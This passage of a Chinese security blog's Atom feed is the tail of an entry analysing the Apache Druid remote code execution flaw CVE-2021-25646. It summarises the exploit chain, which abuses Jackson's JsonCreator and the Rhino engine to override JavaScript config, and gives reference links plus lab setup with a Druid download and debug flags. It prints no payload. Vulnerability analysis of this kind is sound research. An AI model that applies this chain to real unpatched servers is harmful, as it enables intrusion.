JsonCreator的特性，和Druid 支持Rhino引擎，导致最终覆盖javascriptconfig默认参数，可以执行RCE。其实和参考中的几篇分析文章相比没什么其他新的东西。</p><p>从漏洞挖掘思路，猜测大佬事应该是先知道Jackson JsonCreator的这个特性的，然后盯着Rhino引擎搞事情，找出利用链。如果事先未知，从Rhino这点直接去啃Jackson，那就更加佩服了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">tomcat不出网回显连续剧第六集</a></li><li>[2] <a href="https://paper.seebug.org/1476/">漏洞复现: Apache Druid 远程代码执行漏洞 (CVE-2021-25646)</a></li><li>[3] <a href="https://paper.seebug.org/1481/">Apache Druid 远程代码执行漏洞分析(CVE-2021-25646)</a></li><li>[4] <a href="https://blog.csdn.net/zhaoruixiang1111/article/details/52972442">Guice之Servlet基础</a></li><li>[5] <a href="https://www.freebuf.com/vuls/263276.html">Apache Druid远程代码执行漏洞分析(CVE-2021-25646)</a></li><li>[6] <a href="https://blog.csdn.net/blwinner/article/details/98532847">Jackson之注解大全</a></li><li>[7] <a href="https://druid.apache.org/docs/latest/development/javascript.html">JavaScript programming guide</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Litch1大佬的这个洞有意思，终于有时间分析下，记录下分析过程&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/druid/&quot;&gt;https://archive.apache.org/dist/druid/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$wget&lt;/span&gt; https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;amp;&amp;amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据参考，修改conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config，末尾增加调试参数&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-Xdebug -Xnoagent -Djava.compiler&amp;#x3D;NONE -Xrunjdwp:transport&amp;#x3D;dt_socket,server&amp;#x3D;y,suspend&amp;#x3D;n,address&amp;#x3D;5005&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
  </entry>
  
</feed>
